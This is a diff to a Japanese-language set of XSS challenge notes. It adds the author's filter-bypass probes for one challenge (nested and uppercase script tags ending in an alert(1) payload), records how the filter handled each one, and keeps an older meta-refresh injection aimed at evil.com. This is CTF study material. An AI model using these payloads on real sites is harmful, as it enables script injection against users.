@@ -153,6 +153,39 @@ https://stackoverflow.com/questions/18947139/xss-in-meta-tag
 
 <meta property="og:title" content="0;http://evil.com"HTTP-EQUIV="refresh"" />
 ```
+### 13 (IE only)
+### 14 (filter ?)
+いろいろ試した結果`<SCRIPT>`と大文字にすればなんらかのフィルタリングをバイパスできてる！   
+```txt
+<scrscriptipt>
+	<scr
+<scr<script>ipt>
+	<scr<
+<<script>ipt>
+	<<
+<scri<pt>ipt>
+	<scri
+<script<pt>ipt>
+	<
+<scrip<pt>ipt>
+	<scrip
+<SCRIPT>
+	<SCRIPT>
+<script>
+	<script>
+<script>alert(1)
+	<
+<script>a
+	<
+<SCRIPT>a
+	<SCRIPT>a
+<SCRIPT>alert(1)
+	<SCRIPT>alert(1)
+<SCRIPT>alert(1)</SCRIPT>
+```
+### 15 (???)
+おそらく`#`以降をなんやかんやするDOM based？でもJSが特にないのでPHPでなんかやってそう…   
+
 ## XSS Challenges
 https://blogs.tunelko.com/2013/12/02/xss-challenges/   
 writupはここ   
